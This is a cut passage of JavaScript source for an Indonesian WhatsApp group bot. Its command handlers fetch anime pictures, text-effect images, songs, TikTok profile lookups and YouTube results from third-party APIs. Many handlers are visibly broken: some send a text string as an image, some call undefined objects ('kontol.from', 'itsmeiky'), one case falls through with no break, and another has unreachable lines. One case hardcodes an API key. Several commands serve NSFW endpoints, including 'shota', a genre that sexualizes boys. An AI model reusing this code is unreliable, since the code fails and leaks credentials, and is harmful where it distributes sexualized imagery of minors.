		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sakonji`)
					aldi.sendMessage(from, nye, image, { caption: 'sakonji!!', quoted: mek })
					break 
         case 'inosuke':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=inosuke`)
					aldi.sendMessage(from, nye, image, { caption: 'inosuke!!', quoted: mek })
					break 
         case 'zoro': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=zoro`)
					aldi.sendMessage(from, nye, image, { caption: 'zoro!!', quoted: mek })
					break 
         case 'sanji':              
                     if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sanji`)
					aldi.sendMessage(from, nye, image, { caption: 'sanji!!', quoted: mek })
					break        
         case 'gon':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=gon`)
					aldi.sendMessage(from, nye, image, { caption: 'gon!!', quoted: mek })
					break 
           case 'killua':
                   if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=killua`)
					aldi.sendMessage(from, nye, image, { caption: 'killua!!', quoted: mek })
					break 
          case 'sagiri': 
                  if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sagiri`)
					aldi.sendMessage(from, nye, image, { caption: 'sagiri!!', quoted: mek })
					break 
         case 'taiko': case 'natsu': case 'genos': case 'saitama': case 'miku':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
	                if (isBanned) return reply(aml.baned)
	                if (isLimit(sender)) return reply(aml.limitend)
	                reply (aml.wait)
                    kontoll = args.join (' ')
                    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=${kontoll}`)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break
			case 'animefanart':				
			        if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					Buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/random/animefanart?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
					case 'megumin':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					Buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/random/megumin?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
			case 'shinobu':			
                     if (!isGroup) return reply(aml.groupo)	
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					xox = await getBuffer(`https://lolhuman.herokuapp.com/api/random/shinobu?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, xox, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
			case 'baka':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
		            reply (aml.wait)
					Buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/random/baka?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko })
					await limitAdd(sender)
					break
		
			case 'wallpaper':			
                     if (!isGroup) return reply(aml.groupo)	
                     if (!isRegistered) return reply(aml.noregis)
		             if (isBanned) return reply(aml.baned)
					ama = await getBuffer(`https://lolhuman.herokuapp.com/api/random/wallpaper?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, ama, image, {quoted: ftoko })
					break
		case 'smile':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					Buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/random/smile?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
			case 'happy':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					kontol = await getBuffer(`https://lolhuman.herokuapp.com/api/random/happy?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
		case 'dance':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					kontol = await getBuffer(`https://lolhuman.herokuapp.com/api/random/dance?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
		case 'slapnime':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					kontol = await getBuffer(`https://lolhuman.herokuapp.com/api/random/slap?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
		case 'neko3':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					kontol = await getBuffer(`https://lolhuman.herokuapp.com/api/random/neko?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
				case 'wame':
  					 // Fix Bug By aldi				
                     if (!isGroup) return reply(aml.groupo)
                     if (!isRegistered) return reply(aml.noregis)
  					if (isLimit(sender)) return reply(aml.limitend)
  					aldi.updatePresence(from, Presence.composing) 
  					options = {
  					text: `「 SELF WHATSAPP 」\n\n_Request by_ : @${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : https://wa.me/${sender.split("@s.whatsapp.net")[0]}\nOr ( / )\nhttps://api.whatsapp.com/send?phone=${sender.split("@")[0]}`,
  					contextInfo: { mentionedJid: [sender] }
  					}
  					aldi.sendMessage(from, options, text, { quoted: fkontak } )
  					break
  					if (data.error) return reply(data.error)
  					reply(data.result)
					await limitAdd(sender)
  				  break
         case 'tiktokstalk': // Like My Video
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`username tiktok mana om?`)
				    reply (aml.wait)
				    anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/tiktod/stalk/?username=${body.slice(13)}&apikey=${onlydev}`)
				    anu = await getBuffer(anu.result.user.avatarThumb)
				    teks = `➸ Username : ${anu.result.user.uniqueId}\n➸ Nickname : ${anu.result.user.nickname}\n➸ Bio : ${anu.result.user.signature}\n➸ Verified? : ${anu.result.user.verified}\n➸ Jumlah Follower : ${anu.result.stats.followerCount}\n➸ Jumlah Following : ${anu.result.stats.followingCount}\n➸ Jumlah Like : ${anu.result.stats.heart}\n➸ Total Video : ${anu.result.stats.videoCount}`
				     aldi.sendMessage(from, anu, image, {quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } }, caption: teks})
				     await limitAdd(sender)
					case 'joox':
                    query = args.join('  ')
                    if (!isGroup) return reply(aml.groupo)
		            if (!isRegistered) return reply(aml.noregis)
			        if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length < 1) return reply(`Contoh: ${prefix}joox Kokoronashi`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${lolhuman}&query=${query}`)
                    reply (wait)
                    get_result = get_result.result
		            get_info = get_result.info
		            txt = '_[ SUBSCRIBE aldi Fvnky]_\n\n'
                    txt += `Judul : ${get_info.song}\n`
                    txt += `Album : ${get_info.album}\n`
                    txt += `Durasi : ${get_info.duration}\n`
                    txt += `Penyanyi : ${get_info.singer}\n`
                    txt += `Tanggal : ${get_info.date}\n`
                    txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    aldi.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_info.song}.mp3`, quoted: fkontak })
                    break
                    case 'ytplay': //Bang
               if (!isGroup) return reply(aml.groupo)
                 if (args.length == 0) return reply(`Contoh: ${prefix + command} story wa`)
               anu = await fetchJson(`https://dapuhy-api.herokuapp.com/api/socialmedia/ytplaymp3?query=${body.slice(8)}`, {method: 'get'})
               kontol = await getBuffer(anu.thumb)
               teks = `${anu.title}`
               aldi.sendMessage(from, kontol, image, {quoted: fkontak, caption: teks})
               aldi.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', filename: `${teks}.mp3`, quoted: fkontak })
               break
                case 'ytsearch':
                if (!isGroup) return reply(aml.groupo)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} mekukis Senja`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytsearch?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.title}\n`
                        ini_txt += `Viewers : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break
					case 'trap':				
					if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					by = await getBuffer(`https://lolhuman.herokuapp.com/api/random/nsfw/trap?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, by, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
			case 'blackpink':		
			if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/blackpink?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {quoted: fkontak})
				await limitAdd(sender)
				break
			case 'golaldilay':		
			if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/golaldilaybutton?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
			case 'hologram':		
			if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(9)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/hologram3d?apikey=WEMPYGANSS&text=${ct}`)
				itsmeiky.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: iky})
				await limitAdd(sender)
				break
		case 'textbyname':			
		if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/textbyname?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'herrypoter':			
		if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/harrypotter?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'greenneon':		
		   if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/greenneon?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'metallogo':			
		      if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/metallogo?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'waifu2':				
		if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					kontol = await getBuffer(`https://lolhuman.herokuapp.com/api/random/waifu?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
			case 'pasangan':
			if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				pa = `${args.join('  ')}`
				sa = pa.split("/")[0];
				ngan = pa.split("/")[1];
				anu = await fetchJson(`https://api.vhtear.com/primbonjodoh?nama=${sa}&pasangan=${ngan}&apikey=${apivhtear}`, {method: 'get'})
				aldi.sendMessage(from, `${anu.result.hasil}`, {quoted: fkontak})
			await limitAdd(sender) 
			break 
			case 'qoutesnime':
			if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/qoutesnime?apikey=${lolhuman}`)
					reply(anu.data.quote)
					await limitAdd(sender)
					break
			case 'shota':			
			if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/shota?apikey=${lolhuman}`, {method: 'get'})
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak })
                    break
		case 'sagiri':			
		if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/sagiri?apikey=${lolhuman}`, {method: 'get'})
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak })
                    break
			case 'puisiimg':
			if (!isGroup) return reply(aml.groupo)
                   if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
                   pus = await getBuffer(`https://api.vhtear.com/puisi_image&apikey=${apivhtear}`, {method: 'get'})
                   aldi.sendMessage(from, pus, image, {quoted: fkontak})
                   break 
                  case 'playstore':
                  if (!isGroup) return reply(aml.groupo)
                  if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend) 
                ps = `${body.slice(11)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${ZeksApi}&q=${ps}`, {method: 'get'})
                  store = '======================\n'
                  for (let ply of anu.result){
                  store += `• Nama Apk: ${ply.title}\n• ID: ${ply.appid}\n• Developer: ${ply.developer}\n• Link Apk: ${ply.url}\n=====================\n`
                  }
                  reply(store.trim())
                  break
                case 'yuri':
                if (!isGroup) return reply(aml.groupo)
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random2/yuri?apikey=${lolhuman}`, {method: 'get'})
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak })
                    break
                case 'wancak':
                if (!isGroup) return reply(aml.groupo)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/onecak?apikey=${lolhuman}`, {method: 'get'})
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak })
                    break
			case 'kitsune':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/kitsune`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "NIH KAK!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
             case 'snk':
					me = aldi.user
					uptime = process.uptime()
					teks = `*Syarat & Ketentuan*\n1. Teks dan nama pengguna WhatsApp anda kami simpan di dalam server selama bot aktif.\n2. Data anda akan di hapus ketika bot offline.\n3. Kami tidak menyimpan gambar, video, file, audio, dan dokumen yang anda kirim.\n4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.\n5. Jika menemukan Bug/Error silahkan langsung lapor ke Owner bot.\n6. Cukup perintah 1x jika bot tidak merespon harap ulangi kembali, Jika di ulangi kembali tidak merespon, Bot tidak aktif\n7. Anggarang spam, Share virus virtex, Telpon, Video call, Kami akan blockir anda.\n8. Apapun yang anda perintah pada bot ini, *KAMI TIDAK BERTANGGUNG JAWAB!*\n\nTERIMA KASIH !~`
					buffer = await getBuffer(me.imgUrl)
					aldi.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
			case 'jadwaltv':
			        if (!isGroup) return reply(aml.groupo)
		            if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    channel = args[0]
                    tvnow = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolhuman}`, {method: 'get'})
                    tvnow = tvnow.result
                    txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in tvnow) {
                        txt += `${x} - ${tvnow[x]}\n`
                    }
                    reply(txt)
                    break
			case 'kusonimesearch':
			if (!isGroup) return reply(aml.groupo)
		if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolhuman}`, {method: 'get'})
                    get_result = get_result.result
                    text += `Title : ${get_result.title}\n`
                    text += `Japanese : ${get_result.japanese}\n`
                    text += `Genre : ${get_result.genre}\n`
                    text += `Seasons : ${get_result.seasons}\n`
                    text += `Producers : ${get_result.producers}\n`
                    text += `Type : ${get_result.type}\n`
                    text += `Status : ${get_result.status}\n`
                    text += `Total Episode : ${get_result.total_episode}\n`
                    text += `Score : ${get_result.score}\n`
                    text += `Duration : ${get_result.duration}\n`
                    text += `Released On : ${get_result.released_on}\n`
                    text += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    kontol = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: txt })
                    break
			case 'tutuptime': //by ★彡Rҽʂƚα~Fʋɳƙყ彡★
              aldi.updatePresence(from, Presence.composing) 
		if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (!isGroupAdmins) return reply(aml.admin)
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("pilih:\ndetik\nmenit\njam\n\ncontoh\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					aldi.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break
		case 'textdaun':
		if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (args.length < 1) returnreply (aml.wait)
					aruga = args.join('  ')
					reply (aml.wait)
					aruga = await getBuffer(`http://api.lolhuman.xyz/api/textprome/natureleaves?apikey=${lolhuman}&text=${aruga}`)
					aldi.sendMessage(from, aruga, image, {caption: 'Nih kak', quoted: fkontak})
					break
                    case 'femdom':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/femdom`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "NIH KAK!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
			case 'waifukawai':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "KAWAII!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
			case 'kemonomimi':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "ONII CHAN BAKA!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
		case 'kuni':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/kuni`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "INGAT ADA TUHAN!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
		case 'neko2':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/meow`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "NYANG!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
                 case 'holo':
				    try {
					if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						axios.get(`https://nekos.life/api/v2/img/holo`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "NIH OM!!"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
				case 'anime':
				if (!isGroup) return reply(aml.groupo)
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
						reply (aml.wait)
						fs.writeFileSync('./aldiganz/anime.json', JSON.stringify(_anime))
					break
				case 'animesaran':
				if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					qute = await getBuffer(`https://i.ibb.co/F7y89KS/images-2021-01-06-T011202-662.jpg`)
					aldi.sendMessage(from, qute, image, { quoted: fkontak, caption: animesaran() })
					break
			case 'listsurah':
			if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					aldi.sendMessage(from, listsurah() , text, tescuk, cr)
					break
			case 'audio':
			if (!isGroup) return reply(aml.groupo)
				aldi.updatePresence(from, Presence.composing) 
 				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				 ayam = fs.readFileSync('./aldiganz/music.js');
                 jsonData = JSON.parse(ayam);
                 randIndex = Math.floor(Math.random()* jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                aldi.sendMessage(from, ayam, audio, {mimetype: 'audio/mp3', filename: `.mp3`, quoted: fkontak})
				break
			case 'kdu':
			     if (!isGroup) return reply(aml.groupo)
				aldi.updatePresence(from, Presence.composing) 
 	    		if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				 data = fs.readFileSync('./aldiganz/husbu.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random()*  jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.teks.image)
                aldi.sendMessage(hasil, image, mek, '\`\`\`Husbu\`\`\`')
				break
			case 'ganteng':
			        if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					membr = []
					const nus = groupMembers
					const msl = groupMembers
					const siapss = nus[Math.floor(Math.random() *   nus.length)]
					const sipss = pushname[Math.floor(Math.random() *   msl.length)]
					teks = `Yang paling Ganteng disini Adalah : @${siapss.jid.split('@')[0]}`
					membr.push(siapss.jid)
					mentions(teks, membr, true)
					break
                    case 'beban':
                    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					membr = []
					const met = groupMembers
					const msd = groupMembers
					const siapsa = met[Math.floor(Math.random() *  met.length)]
					const sipsd = pushname[Math.floor(Math.random() *   msd.length)]
					teks = `Yang paling Beban disini Adalah : @${siapsa.jid.split('@')[0]}`
					membr.push(siapsa.jid)
					mentions(teks, membr, true)
					break
                    case 'cantik':
                    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					membr = []
					const meo = groupMembers
					const msk = groupMembers
					const siaps = meo[Math.floor(Math.random() *   meo.length)]
